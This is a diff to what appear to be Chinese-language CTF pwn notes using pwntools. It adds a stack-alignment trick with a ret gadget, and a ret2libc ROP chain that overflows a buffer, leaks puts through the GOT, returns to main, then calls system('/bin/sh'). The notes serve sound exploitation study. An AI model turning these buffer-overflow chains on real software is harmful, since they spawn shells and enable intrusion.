@@ -38,6 +38,16 @@ print(hex(pop_rdi))
 
 # Stack
 
+## 栈对齐
+
+```python
+rop = ROP(elf)
+rop.raw(b'a' * (64 + 8))
+rop.raw(flat(ret)) # 方式1. 加个ret即可
+rop.call(system, [bin_sh]) # 栈对齐
+
+# 方式2 不加ret 加参数 rop.call(system, [bin_sh, '0']) # 栈对齐
+```
 ## ret2system
 
 ```sh
@@ -45,4 +55,23 @@ print(hex(pop_rdi))
 elf.plt['system'] + p32(0) + binsh_addr  # 是地址不是 "/bin/sh" 字符
 payload =p32(0) + p32(elf.plt['system']) + p32(0) + p32(stdin_addr+0x10) + b'/bin/sh\x00'
 payload = payload.ljust(0x28, '\x00')
+```
+
+# rop
+
+见 pwn_01_stack_03_ret2libc_x64_00_ctfhub_bypwntool_rop.py
+```sh
+rop = ROP('./ret2libc') # x64
+rop.raw(b'A' * (144 + 8))  # 填充144 + fake_rbp(8) 个字节的数据到缓冲区中
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+# rop.call 会自动 pop rdi, ret来传入参数
+rop.call(puts_plt, [puts_got]) # puts_plt(puts_got, arg2, arg3, arg4, ...)
+rop.call('main')  # 自动构建下一步的ret调用main函数，使程序重新运行
+p.sendline(rop.chain())
+
+# 再发送时要重新构建 rop
+rop = ROP('./ret2libc')
+rop.raw(b'A' * (144 + 8))
+rop.call(system_addr, [binsh_addr])
 ```
